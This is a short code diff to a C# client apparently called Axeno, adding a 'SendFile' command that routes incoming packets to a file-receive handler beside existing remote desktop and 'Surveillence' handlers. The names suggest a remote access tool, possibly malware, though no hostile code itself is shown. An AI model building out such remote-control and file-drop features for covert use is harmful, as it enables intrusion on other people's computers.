@@ -1,6 +1,7 @@
 ﻿using Axeno.Client.MessagePack;
 using Axeno.Client.Networking.Functions;
 using Axeno.Client.Networking.Functions.General;
+using Axeno.Client.Networking.Functions.Networking;
 using Axeno.Client.Networking.Functions.Surveillence;
 using System;
 using System.Collections.Generic;
@@ -58,6 +59,11 @@ namespace Axeno.Client.Networking
                     case "RemoteDesktop":
                         {
                             RemoteDesktop.HandlePacket(msgpck);
+                            break;
+                        }
+                    case "SendFile":
+                        {
+                            ReceiveFile.HandlePacket(msgpck);
                             break;
                         }
                 }
